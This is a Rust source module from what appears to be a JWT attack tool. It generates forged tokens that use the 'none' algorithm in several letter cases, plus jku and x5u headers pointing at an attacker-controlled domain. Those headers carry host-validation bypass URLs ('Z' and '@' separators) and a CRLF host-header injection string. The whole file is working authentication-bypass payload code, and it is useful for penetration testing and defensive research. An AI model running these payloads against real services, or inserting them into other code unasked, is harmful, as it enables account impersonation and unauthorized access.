// Payload module for JWT attack payloads
use base64::{Engine, engine::general_purpose};
use serde_json::json;
use anyhow::Result;
use log::info;

/// Generate none algorithm payloads
pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
    // Split token parts
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }
    
    let claims_part = parts[1];
    
    // Create header with none algorithm
    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });
    
    let header_json = serde_json::to_string(&header)?;
    info!("Generate {} payload header=\"{}\" payload={}", alg_value, header_json, alg_value);
    
    // Encode header to base64
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    
    // Format as JWT (without signature)
    Ok(format!("{}.", format!("{}.{}", encoded_header, claims_part)))
}

/// Generate JKU and X5U payloads for URL manipulation attacks
pub fn generate_url_payload(
    token: &str,
    key_type: &str,
    domain: &str,
    trust_domain: Option<&str>,
    protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();
    
    // Split token parts
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }
    
    let claims_part = parts[1];
    
    // Basic payload
    let header = json!({
        "alg": "hs256",
        key_type: domain,
        "typ": "JWT"
    });
    
    let header_json = serde_json::to_string(&header)?;
    info!("Generate {} + basic payload header=\"{}\" payload={}", key_type, header_json, key_type);
    
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    payloads.push(format!("{}.", format!("{}.{}", encoded_header, claims_part)));
    
    // If trust domain is provided, generate bypass payloads
    if let Some(trust_domain) = trust_domain {
        // Bypass host validation - Z separator
        let bypass_z_url = format!("{}://{}{}{}", protocol, trust_domain, "Z", domain);
        let header = json!({
            "alg": "hs256",
            key_type: bypass_z_url,
            "typ": "JWT"
        });
        
        let header_json = serde_json::to_string(&header)?;
        info!("Generate {} host validation payload header=\"{}\" payload={}", key_type, header_json, key_type);
        
        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.", format!("{}.{}", encoded_header, claims_part)));
        
        // Bypass host validation - @ separator
        let bypass_at_url = format!("{}://{}@{}", protocol, trust_domain, domain);
        let header = json!({
            "alg": "hs256",
            key_type: bypass_at_url,
            "typ": "JWT"
        });
        
        let header_json = serde_json::to_string(&header)?;
        info!("Generate {} host validation payload header=\"{}\" payload={}", key_type, header_json, key_type);
        
        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.", format!("{}.{}", encoded_header, claims_part)));
        
        // Host header injection with CRLF
        let crlf_url = format!("{}://{}%0d0aHost: {}", protocol, trust_domain, domain);
        let header = json!({
            "alg": "hs256",
            key_type: crlf_url,
            "typ": "JWT"
        });
        
        let header_json = serde_json::to_string(&header)?;
        info!("Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}", 
              key_type, header_json, key_type);
        
        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.", format!("{}.{}", encoded_header, claims_part)));
    }
    
    Ok(payloads)
}

/// Generate all available payloads for a token
pub fn generate_all_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();
    
    // None algorithm payloads
    payloads.push(generate_none_payload(token, "none")?);
    payloads.push(generate_none_payload(token, "NonE")?);
    payloads.push(generate_none_payload(token, "NONE")?);
    
    // URL payloads if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        // JKU payloads
        let jku_payloads = generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
        payloads.extend(jku_payloads);
        
        // X5U payloads
        let x5u_payloads = generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
        payloads.extend(x5u_payloads);
    }
    
    Ok(payloads)
}